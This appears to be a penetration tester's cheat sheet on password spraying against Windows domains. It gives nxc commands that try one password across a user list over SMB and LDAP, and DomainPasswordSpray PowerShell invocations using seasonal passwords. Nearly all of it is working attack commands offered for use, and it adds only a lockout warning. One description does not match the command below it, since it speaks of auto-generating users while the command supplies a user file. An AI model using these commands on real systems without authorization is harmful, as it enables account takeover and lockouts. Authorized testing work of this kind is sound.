# Password Spraying
NOTE: Always check or confirm lockout threshold
## nxc
1. Test a single password value with a list of user names
SMB Example:
```
nxc smb 10.0.2.15 -u users.txt -p Password1 --continue-on-success
```
LDAP Example:
```
nxc ldap 10.0.2.15 -u users.txt -p Password1 --continue-on-success
```
## DomainPasswordSpray
[DomainPasswordSpray Project](https://github.com/dafthack/DomainPasswordSpray)
PowerShell tool
```
. .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Spring2017
```
The following command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password of Winter2025.
```
Invoke-DomainPasswordSpray -UserList .\users.txt -Password Winter2025 -Verbose
```

